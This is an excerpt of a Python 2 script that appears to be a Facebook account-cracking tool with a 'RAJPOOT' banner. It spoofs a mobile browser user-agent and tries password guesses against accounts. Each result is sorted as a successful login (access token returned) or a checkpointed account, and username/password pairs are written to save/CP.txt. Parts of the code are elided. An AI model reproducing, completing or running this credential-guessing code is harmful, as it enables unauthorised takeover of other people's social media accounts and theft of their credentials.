...
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996')]
...
\033[97;1m _____                _ _____   ____   ____ _______ 
\033[91;1m|  __ \     /\       | |  __ \ / __ \ / __ \__   __|
\033[92;1m| |__) |   /  \      | | |__) | |  | | |  | | | |   
\033[93;1m|  _  /   / /\ \ _   | |  ___/| |  | | |  | | | |   
\033[95;1m| | \ \  / ____ \ |__| | |    | |__| | |__| | | |   
\033[94;1m|_|  \_\/_/    \_\____/|_|     \____/ \____/  |_|   
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;94m  [RAJPOOT_OK]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m  [RAJPOOT_CP] ' + k + c + user + '  |  ' + pass1
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;95m  [RAJPOOT_CP] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/CP.txt', 'a')
